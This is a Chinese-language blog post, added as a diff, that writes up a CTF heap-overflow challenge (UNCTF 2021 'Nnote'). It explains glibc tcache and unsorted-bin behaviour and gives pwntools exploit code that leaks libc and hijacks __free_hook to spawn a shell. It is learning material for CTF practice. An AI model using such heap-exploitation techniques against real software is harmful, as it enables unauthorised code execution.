@@ -1,0 +1,86 @@
+---
+title: "pwn堆题整理"
+date: 2021-12-23T14:55:04+08:00
+draft: false
+tags: ['pwn', 'ctf']
+categories: ['learning']
+---
+
+* 堆溢出
+** [[https://ctf.unctf.com/#/train][Nnote]]
+花了一周打的UNCTF，光做PWN了，做了7道，就差这道堆题没做出来。最后还有30名以内。。。因为这比赛本身就是入门级的，算是我第一次实战吧。赛后看着wp调试出来。当时应该是找到了漏洞点，但因为基础薄弱最终也没做出来，更别说环境还弄了半天没弄好。。。通过这道题我算是实际开始入门堆了吧。[[https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2021UNCTF][这里]]是官方wp。
+
+*** exp环境
+题目给的libc是2.31
+#+begin_src shell
+patchelf --set-rpath ~/glibc-all-in-one/libs/2.31 ./Nnote
+patchelf --set-interpreter ~/glibc-all-in-one/libs/2.31/ld-2.31.so ./Nnote
+#+end_src
+
+*** 泄漏libc
+从libc-2.26开始加入了TCache，2.28加入对TCache二次释放的检查. TCache为每个线程加入64个单链表的bins，（64bit系统）以16字节递增，从24B到1032B。每个bins最多放7个chunk。堆开头的0x250的堆块就是tcache_perthread_struct. 在free时，如果chunk大小符合要求，就会在放入fastbins之前放入tcache。分配堆块时若从fastbins中成功返回一个chunk，对应fastbins中其他chunk会被放入对应tcache直到装满。small bins中情况类似。chunk合并时chunk会优先放入tcache。tcache中chunk的PREV_INUSE位和在fastbins中一样不会被清零，因此不会被合并。
+
+因此这题需要先构造出大于0x410(1040B)的堆块，释放进unsorted bin。需要注意在想释放的堆块后还要再申请一块chunk，防止因为和topchunk相邻而直接合并进topchunk。unsorted bin中如果只有一个chunk，并且这个chunk在上次分配时被使用过时，若申请一个大小属于small bins(32B-1008B)的空间，会直接从该chunk中进行切割，切出低地址部分返回。
+
+这题申请大小限制不小于0，不大于128，并且根据申请的大小限制了修改时能写入的字节数。但是申请0B的堆块时能通过整数溢出绕过限制条件引起堆溢出。因此这里构造大小为0x480的chunk的方法就是构造9个连在一起的，大小为0x80的chunk（malloc申请的大小为0x78）；然后利用最上面堆块上面的堆溢出覆盖第一块的块大小字段为0x481（块大小字段最低bit为PREV_INUSE）。释放后再申请一个0x80的chunk，会从之前释放到unsorted bin头部割出0x80，导致现在在unsorted bin中的chunk和原来申请的9块中的第二块重叠，输出第二块的数据就可以得到unsorted bin。
+
+#+begin_src python
+    add(0)
+    for i in range(9):
+        add(0x78)
+    add(0x18)
+
+    edit(0 , 'a'*0x18+p64(0x481))
+    delete(1)
+    add(0x78)
+    show(2)
+    __malloc_hook = l64() - 0x70
+    libc.address = __malloc_hook - libc.sym['__malloc_hook']
+#+end_src
+
+得到的地址和main_arena(或__malloc_hook)之间的偏移是固定的。可以在gdb调试里看到与__malloc_hook之间的偏移为0x70。
+
+#+begin_src
+gef➤  bins
+tcachebins
+empty
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x558be3001330 —▸ 0x7f6c92886be0 (main_arena+96) ◂— 0x558be3001330
+smallbins
+empty
+largebins
+empty
+gef➤  x/gx &__malloc_hook
+0x7f6c92886b70 <__malloc_hook>:	0x0000000000000000
+#+end_src
+
+*** 劫持free_hook
+这时候申请两个0x40的chunk，序号分别为11和12. 从unsorted bin中分割出2个chunk，11号chunk和2号chunk重叠。先后释放12和11进入fastbins，修改2号内容即修改fastbins中对应大小的第一块的fd和bk。在fd字段（数据区前8B）写入 =__free_hook - 8= ，申请一个0x40的chunk后再申请一个0x40的chunk，拿到的伪造块的地址就是__free_hook - 8. 修改12号内容，前8B写入 =/bin/sh\x00= ，为伪造的调用free的参数；后8B为 =system_str= 覆盖__free_hook。最后free掉12号块即用伪造的参数调用free，执行 =system("/bin/sh\x00")= .
+
+#+begin_src python
+    system_addr = libc.sym['system']
+    __free_hook = libc.sym['__free_hook']
+
+    add(0x38)
+    add(0x38)
+    delete(12)
+    delete(11)
+
+    edit(2,p64(__free_hook - 8))
+    add(0x38)
+    add(0x38)
+    edit(12, flat( '/bin/sh\x00' , system_addr))
+    delete(12)
+
+    p.interactive()
+#+end_src
+
+* UAF
